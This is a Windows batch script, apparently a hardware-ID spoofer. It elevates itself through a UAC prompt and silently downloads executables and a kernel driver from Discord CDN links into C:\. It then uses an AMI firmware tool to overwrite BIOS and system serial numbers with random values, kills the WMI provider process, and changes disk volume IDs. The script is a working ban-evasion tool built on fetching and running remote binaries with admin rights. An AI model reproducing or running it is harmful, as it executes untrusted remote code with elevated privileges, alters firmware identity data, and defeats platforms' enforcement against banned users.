@echo off
:: BatchGotAdmin
:-------------------------------------

REM --> Check for permissions
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)


REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
echo Requesting Admin...
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params= %*
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"
curl >nul https://cdn.discordapp.com/attachments/974370340681703434/974373853692313680/HardDiskVolumeIDChanger.exe >nul --output C:\HardDiskVolumeIDChanger.exe >nul 2>&1
curl >nul https://cdn.discordapp.com/attachments/974370340681703434/974373853511950406/amifldrv64.sys >nul --output C:\amifldrv64.sys >nul 2>&1
curl >nul https://cdn.discordapp.com/attachments/974370340681703434/974373853302259742/AMIDEWINx64.EXE >nul --output C:\AMIDEWINx64.EXE >nul 2>&1
curl >nul https://cdn.discordapp.com/attachments/974370340681703434/974373853092524142/User.exe >nul --output C:\User.exe>nul >nul 2>&1
cd C:\
AMIDEWINx64.EXE /SU AUTO 

AMIDEWINx64.EXE /BS %RaNdOm%%RaNdOm%%RaNdOm%

AMIDEWINx64.EXE /CS %RaNdOm%%RaNdOm%%RaNdOm%

AMIDEWINx64.EXE /SS %RaNdOm%%RaNdOm%%RaNdOm%

AMIDEWINx64.EXE /PSN %RaNdOm%%RaNdOm%%RaNdOm%

AMIDEWINx64.EXE /IVN %RaNdOm%%RaNdOm%%RaNdOm%

AMIDEWINx64.EXE /IV %RaNdOm%%RaNdOm%%RaNdOm%
AMIDEWINx64.EXE /BM %random%%random%%random%
TASKKILL /F /IM WmiPrvSE.exe
TASKKILL /F /IM WmiPrvSE.exe

HardDiskVolumeIDChanger.exe
timeout /t 10 /NOBREAK
